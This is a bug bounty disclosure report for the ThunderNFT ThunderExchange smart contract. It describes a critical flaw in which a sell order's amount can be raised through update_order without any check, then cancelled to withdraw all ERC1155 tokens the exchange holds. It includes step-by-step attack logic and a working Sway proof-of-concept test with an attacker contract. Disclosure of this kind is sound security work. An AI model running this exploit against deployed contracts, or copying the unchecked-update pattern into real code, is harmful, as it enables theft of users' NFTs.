# IOP \_ ThunderNFT 34955 - \[Smart Contract - Critical] Nfts of type may be stolen by updating an order

Submitted on Sun Sep 01 2024 19:18:04 GMT-0400 (Atlantic Standard Time) by @SimaoAmaro for [IOP | ThunderNFT](https://immunefi.com/bounty/thundernft-iop/)

Report ID: #34955

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/ThunderFuel/smart-contracts/tree/main/contracts-v1/thunder\\_exchange>

Impacts:

* Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

The `ThunderExchange` contract supports depositing nfts of erc115 type, which was also confirmed by the team on discord. It's possible to place an order of just 1 amount of a certain NFT, update it to an amount of the balance of the ThunderExchange of the given erc1155 NFT and then cancel it, stealing all the nfts of the corresponding collection and sub id of the ThunderExchange.

## Vulnerability Details

`ThunderExchange::place_order()`, allows specifying a sell order of any amount.

`ThunderExchange::update_order()`, when the side is `Sell`, does not perform any validation. All validation of the order is performed in `StrategyFixedPriceSale::_validate_updated_order()`, which does not check the amount. Thus, it's possible to modify the amount of the sell order without sending more erc1155 NFTs to the `ThunderExchange`.

The full flow, given in the POC is:

1. Place a sell order of an erc1155 nft with an amount of 1.
2. Update the sell order to an amount equal to the balance of the given nft in the `ThunderExchange`.
3. Cancel the order and receive all the corresponding nft balance.

## Impact Details

All erc1155 nft given by the specified collection and token id are stolen from the `ThunderExchange`.

## References

<https://github.com/ThunderFuel/smart-contracts/blob/main/contracts-v1/thunder\\_exchange/src/main.sw#L124>

## Proof of concept

## Proof of Concept

To run a proof of concept, the exchange was modified to allow a maker of type `Contract`, as Sway tests do not support pranking an EOA.

Additionally, 2 new contracts were created, the user contract simulating the attacker and a erc1155 contract, simulating an erc1155 token.

The full changes were pushed to a github repository which can be shared with the team if requested.

The main test file is the following:

```sway
contract;

 use interfaces::{
    thunder_exchange_interface::{ThunderExchange},
    royalty_manager_interface::*,
    asset_manager_interface::*,
    execution_manager_interface::ExecutionManager,
    execution_strategy_interface::*,
    pool_interface::Pool,
};

use libraries::{
    msg_sender_address::*,
    constants::*,
    order_types::*,
    ownable::*,
};

use std::{
    block::timestamp,
    auth::*,
    call_frames::*,
    context::*,
    contract_id::ContractId,
    logging::log,
    revert::require,
    storage::storage_map::*,
    asset::*
};

abi Erc1155 {
    #[storage(read, write)]
    fn constructor(owner: Identity);

    #[storage(read, write)]
    fn mint(recipient: Identity, sub_id: SubId, amount: u64);

    #[payable]
    #[storage(read, write)]
    fn burn(sub_id: SubId, amount: u64);
}

abi User {
    #[payable]
    #[storage(read, write)]
    fn place_order(thunder_exchange_contract: ContractId, maker_order_input: MakerOrderInput);
    fn cancel_order(thunder_exchange_contract: ContractId, strategy: ContractId, nonce: u64, side: Side);
    fn update_order(thunder_exchange_contract: ContractId, order_input: MakerOrderInput);
}

#[test()]
fn test_attack() {
    initialize_functions();

    call_attack();
}

fn initialize_functions() {
    //initialize all contracts 

    let thunder_exch = abi(ThunderExchange, thunder_exchange::CONTRACT_ID);
    thunder_exch.initialize();

    let asset_mngr = abi(AssetManager, asset_manager::CONTRACT_ID);
    asset_mngr.initialize();

    // required for initialize below contracts
    let exchange_contract_id = ContractId::from(thunder_exchange::CONTRACT_ID);

    let asset_manger_contract_id = ContractId::from(asset_manager::CONTRACT_ID);

    let fixed_strategy = abi(ExecutionStrategy, strategy_fixed_price_sale::CONTRACT_ID);
    fixed_strategy.initialize(exchange_contract_id);

    let execution_manager = abi(ExecutionManager, execution_manager::CONTRACT_ID);
    execution_manager.initialize();

    let royalty_manager = abi(RoyaltyManager, royalty_manager::CONTRACT_ID);
    royalty_manager.initialize();

    let pool = abi(Pool, pool::CONTRACT_ID);
    pool.initialize(exchange_contract_id, asset_manger_contract_id);

    let erc1155 = abi(Erc1155, erc1155::CONTRACT_ID);
    erc1155.constructor(Identity::ContractId(ContractId::this()));

    let execution_manager = abi(ExecutionManager, execution_manager::CONTRACT_ID);
    execution_manager.add_strategy(ContractId::from(strategy_fixed_price_sale::CONTRACT_ID));

    let asset_manager = abi(AssetManager, asset_manager::CONTRACT_ID);
    asset_manager.add_asset(AssetId::new(ContractId::from(erc1155::CONTRACT_ID), SubId::zero()));

    thunder_exch.set_execution_manager(ContractId::from(execution_manager::CONTRACT_ID));
    thunder_exch.set_asset_manager(ContractId::from(asset_manager::CONTRACT_ID));
}

fn call_attack() {
    let thunder_exchange = ContractId::from(thunder_exchange::CONTRACT_ID);
    let strategy = ContractId::from(strategy_fixed_price_sale::CONTRACT_ID);

    let user = abi(User, user::CONTRACT_ID);

    let erc1155 = abi(Erc1155, erc1155::CONTRACT_ID);
    let sub_id = 0x0000000000000000000000000000000000000000000000000000000000000001;

    erc1155.mint(Identity::ContractId(ContractId::from(user::CONTRACT_ID)), sub_id, 2);

    let payment_asset = AssetId::new(ContractId::from(erc1155::CONTRACT_ID), SubId::zero());
    let erc1155_asset = AssetId::new(ContractId::from(erc1155::CONTRACT_ID), sub_id);
    let erc1155_amount = 1;

    let mut maker_order = MakerOrderInput {
        side: Side::Sell,
        maker: Identity::ContractId(ContractId::from(user::CONTRACT_ID)),
        collection: ContractId::from(erc1155::CONTRACT_ID),
        token_id: sub_id,
        price: 1,
        amount: erc1155_amount,
        nonce: 1,
        strategy: strategy,
        payment_asset: payment_asset,
        expiration_range: 100,
        extra_params: ExtraParams {
            extra_address_param: Address::zero(),
            extra_contract_param: ContractId::zero(),
            extra_u64_param: 0,
        },
    };

    let user = abi(User, user::CONTRACT_ID);

    user.place_order(thunder_exchange, maker_order);

    maker_order.nonce = 2;

    user.place_order(thunder_exchange, maker_order);

    maker_order.amount = 2;

    user.update_order(thunder_exchange, maker_order);

    user.cancel_order(thunder_exchange, strategy, 2, Side::Sell);

    assert(balance_of(thunder_exchange, erc1155_asset) == 0);
    assert(balance_of(ContractId::from(user::CONTRACT_ID), erc1155_asset) == 2);
}
```

The user contract is:

```sway
contract;

use interfaces::{
    thunder_exchange_interface::{ThunderExchange},
};

use libraries::{
    order_types::*,
};

abi User {
    #[payable]
    #[storage(read, write)]
    fn place_order(thunder_exchange_contract: ContractId, maker_order_input: MakerOrderInput);

    fn cancel_order(thunder_exchange_contract: ContractId, strategy: ContractId, nonce: u64, side: Side);

    fn update_order(thunder_exchange_contract: ContractId, order_input: MakerOrderInput);
}

impl User for Contract {
    #[payable]
    #[storage(read, write)]
    fn place_order(thunder_exchange_contract: ContractId, maker_order_input: MakerOrderInput) {
        let thunder_exchange = abi(ThunderExchange, thunder_exchange_contract.into());
        let asset_id = AssetId::new(maker_order_input.collection, maker_order_input.token_id);
        thunder_exchange.place_order{asset_id: asset_id.bits(), coins: maker_order_input.amount}(maker_order_input);
    }

    fn cancel_order(thunder_exchange_contract: ContractId, strategy: ContractId, nonce: u64, side: Side) {
        let thunder_exchange = abi(ThunderExchange, thunder_exchange_contract.into());
        thunder_exchange.cancel_order(strategy, nonce, side);
    }

    fn update_order(thunder_exchange_contract: ContractId, order_input: MakerOrderInput) {
        let thunder_exchange = abi(ThunderExchange, thunder_exchange_contract.into());
        thunder_exchange.update_order(order_input);
    }
}
```

The `erc1155` is the same as the `erc721`, but the mint function had the checks removed to allow more than 1 coin per token id:

```sway
fn mint(recipient: Identity, sub_id: SubId, amount: u64) {
    require_not_paused();

    // Mint the ERC1155
    let _ = _mint(
        storage
            .total_assets,
        storage
            .total_supply,
        recipient,
        sub_id,
        amount,
    );
}
```
